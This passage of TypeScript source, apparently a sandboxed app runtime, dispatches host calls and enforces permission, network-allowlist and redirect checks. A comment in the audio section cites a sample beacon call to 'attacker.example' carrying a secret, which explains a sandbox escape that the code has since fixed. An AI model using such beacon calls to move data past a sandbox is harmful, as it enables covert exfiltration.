      case 'camera.startLive':
        return this.handleCameraStartLive(call);
      case 'camera.stopLive':
        return this.handleCameraStopLive();
      case 'mic.record':
        return this.handleMicRecord(call);
      case 'mic.stop':
        return this.handleMicStop();
      case 'mic.isRecording':
        return this.handleMicIsRecording();
      case 'audio.play':
        return this.handleAudioPlay(call);
      case 'audio.stop':
        return this.handleAudioStop(call);
      case 'audio.stopAll':
        return this.handleAudioStopAll();
      case 'audio.setVolume':
        return this.handleAudioSetVolume(call);
      case 'audio.whenEnded':
        return this.handleAudioWhenEnded(call);
      case 'audio.speechCapabilities':
      case 'audio.loadSpeechModel':
      case 'audio.releaseSpeechModel':
      case 'audio.speak':
      case 'audio.speechState':
      case 'audio.whenSpeechEnded':
      case 'audio.stopSpeech':
        return this.handleLocalSpeech(call);
      case 'sandbox.run':
        this.sandboxHost ??= new SandboxHost();
        return this.sandboxHost.run(call.args[0],call.args[1]);
      case 'files.readZipText': {
        this.checkPermission('files');
        const file=getFileByRef(call.args[0]);
        if(!file||file.size>262144)throw Error('Choose a ZIP smaller than 256 KiB');
        const bytes=new Uint8Array(await file.arrayBuffer());
        const files=readZipText(bytes);
        return {files,hash:await sha256Hex(bytes)};
      }
      case 'files.pickFile':
        return this.handleFilesPickFile(call);
      case 'files.readText':
        return this.handleFilesReadText(call);
      case 'files.readBase64':
        return this.handleFilesReadBase64(call);
      case 'files.saveFile':
        return this.handleFilesSaveFile(call);
      case 'input.captureKeys':
        return this.handleInputCaptureKeys(call);
      case 'ai.getCapabilities':
        return this.handleAIGetCapabilities();
      case 'ai.onnx.loadModel':
      case 'ai.onnx.run':
      case 'ai.onnx.release':
      case 'ai.pipeline':
      case 'ai.generate':
      case 'ai.embed':
      case 'ai.classify':
      case 'ai.run':
        // The ONNX and transformers.js engines behind these are gone, and
        // with them about 80 MB of WebAssembly. Said by name, so an app
        // written for them fails with a reason rather than a missing function.
        this.checkPermission('ai');
        throw new Error(`softn.${call.kind} was removed: local models now run on ZIPP, as GGUF chat models through softn.ai.model.load and softn.ai.model.generate`);
      case 'ai.releaseAll':
        return this.handleAIReleaseAll();
      case 'ai.model.load':
        return this.handleAIModelLoad(call);
      case 'ai.model.generate':
        return this.handleAIModelGenerate(call);
      case 'ai.model.cancel':
        this.checkPermission('ai');
        return { cancelled: this.modelHost?.cancel(String(call.args[0] ?? '')) ?? false };
      case 'ai.model.release':
        return this.handleAIModelRelease(call);
      case 'ai.gpu.requestDevice':
        return this.handleGpuRequestDevice(call);
      case 'ai.gpu.createBuffer':
        return this.handleGpuCreateBuffer(call);
      case 'ai.gpu.writeBuffer':
        return this.handleGpuWriteBuffer(call);
      case 'ai.gpu.createShader':
        return this.handleGpuCreateShader(call);
      case 'ai.gpu.createPipeline':
        return this.handleGpuCreatePipeline(call);
      case 'ai.gpu.dispatch':
        return this.handleGpuDispatch(call);
      case 'ai.gpu.readBuffer':
        return this.handleGpuReadBuffer(call);
      case 'ai.gpu.release':
        return this.handleGpuRelease(call);
      case 'ai.gpu.releaseAll':
        return this.handleGpuReleaseAll();
      case 'storage.op':
        return this.handleStorageOp(call);
      case 'bundle.read':
        return this.handleBundleRead(call);
      case 'dialog.alert': {
        // A page's alert(), shown when its turn is over: nothing waits on it.
        //
        // Never the browser's own dialog. That one says it is the host
        // speaking ("softn.com says…"), and holds the whole tab until it is
        // answered: an app could word a host's request for a password, or
        // raise one from a timer each time the last was closed, so nobody
        // could reach the permission bar or leave. It is shown in the app,
        // as the app's; not while the permission bar is asking, so nothing
        // the app says sits beside that question; and not past a limit.
        const [message] = call.args;
        if (this.permissionConfig?.consentPending) return null;
        if (++this.alertsShown > SoftNScriptRuntime.MAX_ALERTS) return null;
        const text = String(message ?? '').slice(0, 2000);
        if (this.onAlert) this.onAlert(text);
        else console.warn(`[SoftN] The app says: ${text}`);
        return null;
      }
      default:
        throw new Error(`Unknown host call: ${call.kind}`);
    }
  }

  // ── Permission checks ──

  private checkPermission(capability: string): void {
    if (!this.permissionConfig) {
      // No permission.json means no capabilities. This used to allow everything
      // "for backward compatibility", which inverted the whole model: a bundle
      // that declared nothing got the network, the camera, the filesystem, AI
      // and the GPU with no prompt, while an honest bundle that declared what it
      // needed got a consent dialog the user could refuse. Declaring less bought
      // more. The user is never asked, because there is nothing to ask about —
      // the bundle claimed to need nothing.
      throw new Error(
        `${capability} access not permitted: this bundle ships no permission.json. ` +
          `Declare the capabilities it needs — { "permissions": { "${capability}": { "enabled": true } } } — ` +
          `so the user can see and approve them.`
      );
    }
    if (this.permissionConfig.consentPending) {
      // Running with everything withheld until the user answers the consent
      // bar. Deny like any other missing capability, but say why: the bundle
      // did declare this, so telling the author to declare it is a lie the
      // user cannot act on.
      throw new Error(
        `${capability} access not permitted yet: this app has asked for it and you have not allowed it. ` +
          `Choose Allow in the permission bar at the top of the app to grant it.`
      );
    }
    // Permission config IS set — deny by default for any capability not
    // explicitly enabled. Explicitly means the boolean true: a declaration
    // spelt "enabled": "true" or 1 is what inspectDeclaration reports as
    // malformed and the consent bar requests nothing for, so a truthiness
    // check here ran the app with a capability nobody was asked about.
    const perms = this.permissionConfig.permissions;
    switch (capability) {
      case 'net':
        if (perms.net?.enabled !== true)
          throw new Error('Network access not permitted. Add net.enabled to permission.json');
        break;
      case 'camera':
        if (perms.camera?.enabled !== true)
          throw new Error('Camera access not permitted. Add camera.enabled to permission.json');
        break;
      case 'mic':
        if (perms.mic?.enabled !== true)
          throw new Error('Microphone access not permitted. Add mic.enabled to permission.json');
        break;
      case 'files':
        if (perms.files?.enabled !== true)
          throw new Error('File access not permitted. Add files.enabled to permission.json');
        break;
      case 'qr':
        if (perms.qr?.enabled !== true)
          throw new Error('QR access not permitted. Add qr.enabled to permission.json');
        break;
      case 'ai':
        if (perms.ai?.enabled !== true)
          throw new Error('AI access not permitted. Add ai.enabled to permission.json');
        break;
      case 'gpu':
        if (perms.gpu?.enabled !== true)
          throw new Error('GPU compute access not permitted. Add gpu.enabled to permission.json');
        break;
      case 'sync':
        if (perms.sync?.enabled !== true)
          throw new Error('Sync not permitted. Add sync.enabled to permission.json');
        break;
      case 'storage':
        if (perms.storage?.enabled !== true)
          throw new Error('Server storage not permitted. Add storage.enabled to permission.json');
        break;
      case 'accel':
        if (perms.accel?.enabled !== true)
          throw new Error('Host acceleration not permitted. Add accel.enabled to permission.json');
        break;
      default:
        throw new Error(`Unknown capability: ${capability}. Add it to permission.json`);
    }
  }

  /**
   * Scheme, `allow_http` and `allowed_hosts`, judged by the one evaluator the
   * renderer's markup sinks and the server-sync effect also use, so a host the
   * bundle scoped itself away from is out of reach by every route rather than
   * only by `softn.net.fetch`.
   */
  private checkNetHost(url: string): void {
    const verdict = describeNetDestination(url, this.permissionConfig?.permissions.net);
    if (!verdict.allowed) throw new Error(verdict.reason);
  }

  // ── Host call handlers ──

  private async handleNetFetch(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('net');
    const [url, optionsJson] = call.args;
    this.checkNetHost(url);
    const options = optionsJson ? JSON.parse(optionsJson) : {};

    // Disable redirects to prevent allowlist bypass: a redirect from an
    // allowed host to an internal/disallowed host would skip checkNetHost.
    const requestedTimeout = Number(options.timeout);
    const timeoutMs = Number.isFinite(requestedTimeout)
      ? Math.max(1, Math.min(60_000, requestedTimeout))
      : 15_000;
    const abortController = new AbortController();
    const timeout = setTimeout(() => abortController.abort(), timeoutMs);
    this.netAbortControllers.add(abortController);

    try {
      const resp = await fetch(url, {
        method: options.method || 'GET',
        headers: options.headers,
        // The bridge serialises the whole options object once, so a string
        // body arrives here as the string the script wrote; encoding it again
        // sent `"a=1"` as `"\"a=1\""` and no form or text endpoint could read
        // it. An object body is what the second encoding was for.
        body:
          typeof options.body === 'string'
            ? options.body || undefined
            : options.body
              ? JSON.stringify(options.body)
              : undefined,
        signal: abortController.signal,
        redirect: 'error',
        // The app's request, not the host's: no cookie or login of the page
        // it is drawn in goes with it, and the server is not told that page's
        // address. An app that signs in says so itself (an Authorization
        // header), or asks the host's backend (`softn.backend`).
        credentials: 'omit',
        referrerPolicy: 'no-referrer',
      });

      const declaredHeader = resp.headers.get('content-length');
      const declaredLength = declaredHeader === null ? NaN : Number(declaredHeader);
      if (
        Number.isFinite(declaredLength) &&
        declaredLength > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES
      ) {
        try {
          await resp.body?.cancel();
        } catch {
          // Preserve the response-size error if the stream was disturbed.
        }
        throw new Error('Network response is too large');
      }

      let body: string;
      if (resp.body) {
        const reader = resp.body.getReader();
        const decoder = new TextDecoder();
        const textChunks: string[] = [];
        let total = 0;
        try {
          let next = await reader.read();
          while (!next.done) {
            if (next.value) {
              total += next.value.byteLength;
              if (total > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES) {
                try {
                  await reader.cancel();
                } catch {
                  // Preserve the response-size error if cancellation fails.
                }
                throw new Error('Network response is too large');
              }
              textChunks.push(decoder.decode(next.value, { stream: true }));
            }
            next = await reader.read();
          }
          textChunks.push(decoder.decode());
        } finally {
          reader.releaseLock();
        }
        body = textChunks.join('');
      } else {
        const bytes = await resp.arrayBuffer();
        if (bytes.byteLength > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES) {
          throw new Error('Network response is too large');
        }
        body = new TextDecoder().decode(bytes);
      }

      return {
        ok: resp.ok,
        status: resp.status,
        statusText: resp.statusText,
        body,
        headers: Object.fromEntries(resp.headers),
      };
    } finally {
      clearTimeout(timeout);
      this.netAbortControllers.delete(abortController);
    }
  }

  /**
   * A page's `fetch('data.json')`: the app's own file, read where its
   * markup's `src` would find it, with no network and no permission, as an
   * image of its is. A bundle's file is a `blob:` address; a site's (page
   * mode) a path in the page's own folder. Anything else is not one of the
   * app's files, and is not found.
   */
  private async handleBundleRead(call: PendingHostCall): Promise<unknown> {
    const notFound = { ok: false, status: 404, statusText: 'Not Found', body: '', headers: {} };
    const path = String(call.args[0] ?? '').replace(/[?#].*$/, '').replace(/^\.\//, '');
    const url = path && this.assetResolver ? this.assetResolver(path) : '';
    if (!url || (!/^blob:/i.test(url) && /^[a-z][a-z0-9+.-]*:|^[\\/]{2}/i.test(url))) return notFound;
    try {
      const resp = await fetch(url, { redirect: 'error' });
      if (!resp.ok) return { ...notFound, status: resp.status, statusText: resp.statusText };
      const body = await resp.text();
      if (body.length > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES) throw new Error('The file is too large');
      const type = resp.headers.get('content-type');
      return { ok: true, status: 200, statusText: 'OK', body, headers: type ? { 'content-type': type } : {} };
    } catch (error) {
      return { error: error instanceof Error ? error.message : 'The file could not be read' };
    }
  }

  /**
   * One of the app's own files as a Blob, for a model it ships: from the
   * bundle provider a host supplied, else where the app's markup would find
   * it (the `fetch('data.json')` rule above). Null when it has no such file.
   */
  private async readBundleBlob(path: string): Promise<Blob | null> {
    const clean = path.replace(/^\.\//, '');
    if (this.bundleFileProvider) {
      const data = await this.bundleFileProvider.readFile(clean);
      return data ? new Blob([data]) : null;
    }
    const url = this.assetResolver ? this.assetResolver(clean) : '';
    if (!url || (!/^blob:/i.test(url) && /^[a-z][a-z0-9+.-]*:|^[\\/]{2}/i.test(url))) return null;
    const resp = await fetch(url, { redirect: 'error' });
    return resp.ok ? resp.blob() : null;
  }

  private async handleLocalSpeech(call: PendingHostCall): Promise<unknown> {
    // The device's own voices only: nothing is downloaded, so speech asks for
    // no permission (local-speech.ts). Loaded at an app's first speech call.
    if (!this.localSpeech) {
      const { LocalSpeechHost } = await import('./local-speech');
      this.localSpeech ??= new LocalSpeechHost();
      // The app may have closed while the module loaded, when cleanup() had no
      // host to stop: this one stops at once, so it answers as a closed app's
      // host does and speaks for nobody (nor holds the device's voice from
      // the apps still open).
      if (this.disposed) this.localSpeech.dispose();
    }
    return this.localSpeech.handle(call.kind,call.args);
  }

  private async handleQrEncode(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('qr');
    const [text] = call.args;
    // Return the text — actual QR rendering is done by the QRCode component
    return { text, encoded: true };
  }

  private async handleQrDecode(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('qr');
    const [imageDataUrl] = call.args;
    // The argument goes straight to `img.src`, so a remote URL here is a GET
    // to that host on the bundle's behalf — the same egress `softn.net.fetch`
    // and `softn.audio.play` are held to. `qr` alone says nothing about the
    // network; a data: or blob: image, the ordinary case, carries its bytes.
    if (typeof imageDataUrl === 'string' && isRemoteUrl(imageDataUrl)) {
      this.checkPermission('net');
      this.checkNetHost(imageDataUrl);
    }
    // Use BarcodeDetector API if available
    if ('BarcodeDetector' in globalThis) {
      try {
        const detector = new (
          globalThis as unknown as {
            BarcodeDetector: new (opts: { formats: string[] }) => {
              detect: (img: HTMLImageElement) => Promise<Array<{ rawValue: string }>>;
            };
          }
        ).BarcodeDetector({ formats: ['qr_code'] });
        const img = new Image();
        await new Promise<void>((resolve, reject) => {
          let settled = false;
          let timeout: ReturnType<typeof setTimeout> | null = null;

          const finish = (error?: Error) => {
            if (settled) return;
            settled = true;
            if (timeout) clearTimeout(timeout);
            img.onload = null;
            img.onerror = null;
            this.qrDecodeCancelers.delete(cancel);
            if (error) {
              // Removing the source asks the browser to abandon any decode work
              // still associated with this detached image.
              img.removeAttribute('src');
              reject(error);
            } else {
              resolve();
            }
          };
          const cancel = () => finish(new Error('QR image load cancelled'));

          this.qrDecodeCancelers.add(cancel);
          img.onload = () => finish();
          img.onerror = () => finish(new Error('Could not load QR image'));
          timeout = setTimeout(
            () => finish(new Error('QR image load timed out')),
            SoftNScriptRuntime.QR_OPERATION_TIMEOUT_MS
          );
          img.src = imageDataUrl;
        });
        const results = await new Promise<Array<{ rawValue: string }>>((resolve, reject) => {
          let settled = false;
          const finish = (result?: Array<{ rawValue: string }>, error?: unknown) => {
            if (settled) return;
            settled = true;
            clearTimeout(timeout);
            this.qrDecodeCancelers.delete(cancel);
            if (error) reject(error);
            else resolve(result ?? []);
          };
          const cancel = () => finish(undefined, new Error('QR detection cancelled'));
          const timeout = setTimeout(
            () => finish(undefined, new Error('QR detection timed out')),
            SoftNScriptRuntime.QR_OPERATION_TIMEOUT_MS
          );

          this.qrDecodeCancelers.add(cancel);
          detector.detect(img).then(
            (result) => finish(result),
            (error) => finish(undefined, error)
          );
        });
        if (results.length > 0) {
          return { data: results[0].rawValue };
        }
      } catch {
        /* fallthrough */
      }
    }
    return { data: null, error: 'QR detection not available' };
  }

  private async handleCameraCapture(_call: PendingHostCall): Promise<unknown> {
    this.checkPermission('camera');
    // Camera capture is handled by the Camera component — this is a no-op
    // that tells the host to trigger the Camera component's capture
    return { pending: true, message: 'Use Camera component for capture' };
  }

  private async handleCameraRecord(_call: PendingHostCall): Promise<unknown> {
    this.checkPermission('camera');
    return { pending: true, message: 'Use Camera component for recording' };
  }

  private async handleCameraStartLive(_call: PendingHostCall): Promise<unknown> {
    this.checkPermission('camera');
    return { pending: true, message: 'Use Camera component for live mode' };
  }

  private async handleCameraStopLive(): Promise<unknown> {
    return { stopped: true };
  }

  // ── Microphone ──
  //
  // Gated, unlike audio playback. The comment below `── Audio ──` argues that
  // sound is a nuisance rather than a disclosure because "it reads nothing,
  // sends nothing" — a microphone is precisely the thing that fails that test.
  //
  // This is the script route, for an app that wants a recording without putting
  // a viewfinder on screen. The `<Microphone>` component is the other route and
  // opens the device itself, the same way `<Camera>` does; in both cases the
  // browser's own permission prompt is what stands in front of the hardware.

  /**
   * Record from the default input and return it as a WAV data URL.
   *
   * Raw PCM rather than MediaRecorder's Opus: see runtime/wav.ts. Options are
   * `seconds` (default 5), `sampleRate` (default 48000) and `processing`
   * (default true — echo cancellation, noise suppression and gain control,
   * which are right for speech and wrong for anything measuring the sound).
   */
  private async handleMicRecord(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('mic');

    if (this.micRecording || this.micAcquisition) {
      return { recorded: false, reason: 'already recording' };
    }
    if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) {
      return { recorded: false, reason: 'no microphone support' };
    }

    const [optionsJson] = call.args;
    const options = optionsJson
      ? (JSON.parse(optionsJson) as {
          seconds?: number;
          sampleRate?: number;
          processing?: boolean;
        })
      : {};

    const processing = options.processing !== false;
    const wantedRate =
      typeof options.sampleRate === 'number' && options.sampleRate > 0 ? options.sampleRate : 48000;
    // A cap the bundle declared is a promise to the user that the consent
    // dialog showed them, so it wins over whatever the script asks for.
    const declaredCap = this.permissionConfig?.permissions.mic?.maxSeconds;
    const requested =
      typeof options.seconds === 'number' && options.seconds > 0 ? options.seconds : 5;
    const seconds = Math.min(
      requested,
      typeof declaredCap === 'number' && declaredCap > 0 ? declaredCap : 300
    );

    const acquisition = { cancelled: false };
    this.micAcquisition = acquisition;

    let stream: MediaStream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: processing,
          noiseSuppression: processing,
          autoGainControl: processing,
          sampleRate: { ideal: wantedRate },
          channelCount: { ideal: 1 },
        },
      });
    } catch (err) {
      // A DOMException, which does not inherit from Error — reading `.message`
      // directly is what keeps "Permission denied" from becoming "failed".
      const name =
        typeof err === 'object' && err !== null
          ? ((err as { message?: string }).message ?? (err as { name?: string }).name)
          : undefined;
      if (this.micAcquisition === acquisition) this.micAcquisition = null;
      return { recorded: false, reason: name ?? 'could not open the microphone' };
    }

    if (this.micAcquisition === acquisition) this.micAcquisition = null;
    if (acquisition.cancelled || this.disposed) {
      stream.getTracks().forEach((track) => track.stop());
      return { recorded: false, reason: 'stopped' };
    }

    const AudioContextCtor =
      (
        globalThis as {
          AudioContext?: typeof AudioContext;
          webkitAudioContext?: typeof AudioContext;
        }
      ).AudioContext ??
      (globalThis as { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
    if (!AudioContextCtor) {
      stream.getTracks().forEach((t) => t.stop());
      return { recorded: false, reason: 'no Web Audio support' };
    }

    // Asking the context for the rate is what actually resamples: the
    // getUserMedia constraint above is widely ignored, and a graph left at the
    // hardware rate would hand back 44100 samples labelled 48000.
    let context: AudioContext;
    try {
      try {
        context = new AudioContextCtor({ sampleRate: wantedRate });
      } catch {
        context = new AudioContextCtor();
      }
    } catch (err) {
      // Constructing an AudioContext can fail because the browser has reached
      // its context limit or disabled Web Audio. The microphone stream was
      // already granted at this point, so it must still be released.
      stream.getTracks().forEach((track) => track.stop());
      return { recorded: false, reason: String(err) };
    }
    const rate = context.sampleRate;

    const blocks: Float32Array[] = [];
    let total = 0;

    return new Promise<unknown>((resolve) => {
      let settled = false;
      let timer: ReturnType<typeof setTimeout> | null = null;
      let processor: ScriptProcessorNode | null = null;
      let source: MediaStreamAudioSourceNode | null = null;
      let sink: GainNode | null = null;

      const finish = (reason: 'complete' | 'stopped') => {
        if (settled) return;
        settled = true;
        if (timer) clearTimeout(timer);
        this.micRecording = null;

        if (processor) {
          processor.onaudioprocess = null;
          processor.disconnect();
        }
        if (source) source.disconnect();
        if (sink) sink.disconnect();
        void context.close().catch(() => {
          /* already closed */
        });
        stream.getTracks().forEach((t) => t.stop());

        const samples = new Float32Array(total);
        let offset = 0;
        for (const block of blocks) {
          samples.set(block, offset);
          offset += block.length;
        }

        resolve({
          recorded: total > 0,
          reason,
          dataUrl: pcmToWavDataUrl(samples, rate),
          sampleRate: rate,
          sampleCount: total,
          duration: total / rate,
          mimeType: 'audio/wav',
        });
      };

      try {
        source = context.createMediaStreamSource(stream);
        // ScriptProcessorNode rather than an AudioWorklet: a worklet has to be
        // loaded from a URL, and the only URL the runtime can mint for itself
        // is a blob — which a strict content security policy will refuse. The
        // component takes the worklet route and falls back to this one; here,
        // where there is no visible element to degrade, taking the reliable
        // route directly is worth the main-thread cost of a short recording.
        processor = context.createScriptProcessor(4096, 1, 1);
        processor.onaudioprocess = (event) => {
          if (settled) return;
          // The buffer belongs to the next callback, so it is copied, not kept.
          const block = event.inputBuffer.getChannelData(0);
          blocks.push(new Float32Array(block));
          total += block.length;
        };
        source.connect(processor);
        // A ScriptProcessorNode only runs while connected to something. A
        // zero-gain sink keeps it pulling without routing the microphone to the
        // speakers, which would be a feedback loop.
        sink = context.createGain();
        sink.gain.value = 0;
        processor.connect(sink);
        sink.connect(context.destination);
      } catch (err) {
        settled = true;
        stream.getTracks().forEach((t) => t.stop());
        void context.close().catch(() => {});
        resolve({ recorded: false, reason: String(err) });
        return;
      }

      this.micRecording = { stop: finish };
      timer = setTimeout(() => finish('complete'), Math.round(seconds * 1000));
    });
  }

  /** End a recording early. The pending `mic.record` callback still fires. */
  private async handleMicStop(): Promise<unknown> {
    if (this.micRecording) {
      this.micRecording.stop('stopped');
      return { stopped: true };
    }
    if (!this.micAcquisition) return { stopped: false, reason: 'not recording' };
    this.micAcquisition.cancelled = true;
    return { stopped: true };
  }

  private async handleMicIsRecording(): Promise<unknown> {
    return { recording: this.micRecording !== null || this.micAcquisition !== null };
  }

  /** Close any open microphone. Called from cleanup, and safe when idle. */
  private stopMicrophone(): void {
    if (this.micAcquisition) this.micAcquisition.cancelled = true;
    this.micRecording?.stop('stopped');
  }

  // ── Audio ──
  //
  // Playing a bundle's own sound needs no capability: a `blob:`, `data:` or
  // bundle-relative source carries its bytes with it, reads nothing and sends
  // nothing, and a template can write `<audio src=… autoPlay>` for the same
  // effect. A remote source is a different act. `new Audio(url)` issues the GET
  // whether or not autoplay policy lets the sound out, and `audio.whenEnded`
  // reports 'ended' separately from 'error' — so an unchecked remote src is not
  // only a beacon, it is a read-back oracle telling the bundle whether the
  // request succeeded. That is `softn.net.fetch` wearing a different name, and
  // it goes behind the same gate and the same allowed_hosts list.
  //
  // This comment used to say "sound is a nuisance, not a disclosure: it reads
  // nothing, sends nothing", and that reasoning was why no gate was here.
  // Proven wrong against the real runtime: with every capability withheld,
  // audio.play('https://attacker.example/beacon?secret=1') constructed the
  // element with that exact URL and answered {played:true}.

  /**
   * Turn whatever the script passed into something an <audio> can load.
   *
   * Scripts say `softn.audio.play("assets/blip.wav")` — a path inside their own
   * bundle, which only the host knows how to resolve. That is the same job
   * `asset()` does for templates, so it is the same function doing it.
   */
  private resolveAudioSrc(src: string): string {
    if (!src) return '';
    if (/^(blob:|data:|https?:)/i.test(src)) return src;
    const asset = this.externalFunctions?.asset;
    if (typeof asset === 'function') {
      const resolved = asset(src);
      if (typeof resolved === 'string' && resolved) return resolved;
    }
    return src;
  }

  private async handleAudioPlay(call: PendingHostCall): Promise<unknown> {
    if (typeof Audio === 'undefined') return { played: false, reason: 'no audio support' };

    const [rawSrc, optionsJson] = call.args;
    const options = optionsJson
      ? (JSON.parse(optionsJson) as {
          volume?: number;
          loop?: boolean;
          rate?: number;
        })
      : {};

    const src = this.resolveAudioSrc(rawSrc);
    if (!src) return { played: false, reason: `no such sound: ${rawSrc}` };

    // Checked on the resolved URL, not the argument: `asset()` answers with a
    // blob: or data: URL for a bundle path, and a path it does not recognise
    // comes back unchanged — including a protocol-relative `//host/x`, which
    // the browser resolves against the page's own http(s) scheme.
    if (isRemoteUrl(src)) {
      this.checkPermission('net');
      this.checkNetHost(src);
    }

    const el = new Audio(src);
    const own = typeof options.volume === 'number' ? Math.max(0, Math.min(1, options.volume)) : 1;
    el.volume = own * this.audioMasterVolume;
    el.loop = options.loop === true;
    if (typeof options.rate === 'number' && options.rate > 0) el.playbackRate = options.rate;

    const handle = `snd-${++this.audioSeq}`;
    // The sound's own volume is kept beside it: master volume scales it, and
    // reading it back off the element would fold the master in twice.
    this.audioPlaying.set(handle, { el, volume: own, watchers: [] });
    // One-shots clear themselves; loops stay until stopped or the app closes.
    el.addEventListener(
      'ended',
      () => {
        const outcome: AudioOutcome = { handle, status: 'ended' };
        if (Number.isFinite(el.duration)) outcome.durationMs = el.duration * 1000;
        this.finishAudio(handle, outcome);
      },
      { once: true }
    );
    // A src that fails to decode reports itself here, not through play() — a
    // watcher waiting on the sound would otherwise wait forever.
    el.addEventListener(
      'error',
      () => {
        this.finishAudio(handle, {
          handle,
          status: 'error',
          reason: el.error?.message || 'could not play',
        });
      },
      { once: true }
    );

    try {
      await el.play();
      return { played: true, handle };
    } catch (err) {
      const name =
        typeof err === 'object' && err !== null ? (err as { name?: string }).name : undefined;
      // Browsers refuse to make noise before the user has interacted with the
      // page. That is the policy working, not a fault, so it is reported rather
      // than thrown — and a soundtrack (anything looping) is held back and
      // started on the first gesture instead of being silently lost.
      if (name === 'NotAllowedError') {
        if (el.loop) {
          this.armAudioUnlock(handle, el);
          return { played: false, blocked: true, pending: true, handle };
        }
        this.audioPlaying.delete(handle);
        return {
          played: false,
          blocked: true,
          reason: 'the page has not been interacted with yet',
        };
      }
      this.audioPlaying.delete(handle);
      return { played: false, reason: name ?? 'could not play' };
    }
  }

  /** Start a blocked loop as soon as the user touches the page, once. */
  private armAudioUnlock(handle: string, el: HTMLAudioElement): void {
    if (typeof window === 'undefined') return;
    const start = () => {
      window.removeEventListener('pointerdown', start);
      window.removeEventListener('keydown', start);
      this.audioUnlockers.delete(start);
      // It may have been stopped, or the whole runtime torn down, while waiting.
      if (this.disposed || !this.audioPlaying.has(handle)) return;
      el.play().catch(() => {
        this.finishAudio(handle, { handle, status: 'error', reason: 'could not play' });
      });
    };
    this.audioUnlockers.add(start);
    window.addEventListener('pointerdown', start, { once: true });
    window.addEventListener('keydown', start, { once: true });
  }

  /**
   * The one place a sound becomes past tense: watchers hear the outcome, the
   * handle stops being live, and the outcome is kept for late askers. First
   * outcome wins — a stop landing after an error, or the 'error' that clearing
   * `src` on teardown fires, must not rewrite what already happened.
   */
  private finishAudio(handle: string, outcome: AudioOutcome): void {
    const sound = this.audioPlaying.get(handle);
    if (!sound) return;
    for (const watcher of sound.watchers) watcher(outcome);
    this.audioPlaying.delete(handle);
    this.audioFinished.set(handle, outcome);
    if (this.audioFinished.size > SoftNScriptRuntime.MAX_AUDIO_FINISHED) {
      const oldest = this.audioFinished.keys().next().value;
      if (oldest !== undefined) this.audioFinished.delete(oldest);
    }
  }

  private async handleAudioStop(call: PendingHostCall): Promise<unknown> {
    const [handle] = call.args;
    if (!handle) return this.handleAudioStopAll();
    const sound = this.audioPlaying.get(handle);
    if (!sound) return { stopped: false };
    sound.el.pause();
    sound.el.currentTime = 0;
    this.finishAudio(handle, { handle, status: 'stopped' });
    return { stopped: true };
  }

  private async handleAudioStopAll(): Promise<unknown> {
    const count = this.audioPlaying.size;
    this.stopAllAudio();
    return { stopped: count };
  }

  private async handleAudioSetVolume(call: PendingHostCall): Promise<unknown> {
    const value = Number(call.args[0]);
    if (!Number.isFinite(value)) return { volume: this.audioMasterVolume };
    this.audioMasterVolume = Math.max(0, Math.min(1, value));
    // Applies to what is already playing too, or turning the music down would
    // only take effect on the next sound.
    for (const sound of this.audioPlaying.values()) {
      sound.el.volume = sound.volume * this.audioMasterVolume;
    }
    return { volume: this.audioMasterVolume };
  }

  /**
   * Resolves when the sound is over, with how it got there: 'ended' on its
   * own, 'stopped' by a script or teardown, 'error' if it never could play.
   * The distinction is the point — being cut off must never read as having
   * finished. A handle nothing remembers answers immediately: whatever it
   * once named, it is not playing now.
   */
  private async handleAudioWhenEnded(call: PendingHostCall): Promise<unknown> {
    const [handle] = call.args;
    const finished = this.audioFinished.get(handle);
    if (finished) return finished;
    const sound = this.audioPlaying.get(handle);
    if (!sound) return { handle, status: 'ended', known: false };
    return new Promise<AudioOutcome>((resolve) => {
      sound.watchers.push(resolve);
    });
  }

  private stopAllAudio(): void {
    for (const [handle, { el }] of this.audioPlaying) {
      try {
        el.pause();
        el.src = '';
      } catch {
        // The element may already be detached; nothing left to stop.
      }
      this.finishAudio(handle, { handle, status: 'stopped' });
    }
    this.audioPlaying.clear();
    if (typeof window !== 'undefined') {
      for (const unlock of this.audioUnlockers) {
        window.removeEventListener('pointerdown', unlock);
        window.removeEventListener('keydown', unlock);
      }
    }
    this.audioUnlockers.clear();
  }

  private async handleFilesPickFile(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('files');
    const options = call.args[0] ? JSON.parse(call.args[0]) : {};
    return new Promise<unknown>((resolve) => {
      const input = document.createElement('input');
      input.type = 'file';
      if (options.accept) input.accept = options.accept;
      if (options.multiple) input.multiple = true;
      input.onchange = () => {
        const files = Array.from(input.files || []);
        const result = files.map((f) => ({
          name: f.name,
          size: f.size,
          type: f.type,
          ref: registerFileRef(f),
        }));
        resolve(result);
      };
      input.oncancel = () => resolve([]);
      input.click();
    });
  }

  private async handleFilesReadText(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('files');
    const [fileRef] = call.args;
    const file = getFileByRef(fileRef);
    if (!file) throw new Error(`File not found: ${fileRef}`);
    return await file.text();
  }

  private async handleFilesReadBase64(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('files');
    const [fileRef] = call.args;
    const file = getFileByRef(fileRef);
    if (!file) throw new Error(`File not found: ${fileRef}`);
    return new Promise<string>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as string);
      reader.onerror = () => reject(new Error('Failed to read file'));
      reader.readAsDataURL(file);
    });
  }

  /**
   * `softn.input.captureKeys(keys)`: the keys whose browser default the
   * window bridge cancels before the script's handler sees them. Not a
   * gated capability: it changes nothing but the page the app already
   * owns, and never touches a text field or a browser chord.
   */
  private async handleInputCaptureKeys(call: PendingHostCall): Promise<unknown> {
    const keys = parseCapturedKeys(call.args[0]);
    setCapturedKeys(this, keys);
    return { captured: keys.length };
  }

  /**
   * Save a file the app produced: the content becomes a Blob and the browser's
   * own download handles the rest, so where it lands and whether it is
   * confirmed is the user's setting, not the app's. Text by default; with
   * `base64: true` the content is decoded to bytes first, which is how an
   * app hands over an image or a zip. Gated with the other file calls: an
   * app that may open the user's files may also give them one.
   */
  private async handleFilesSaveFile(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('files');
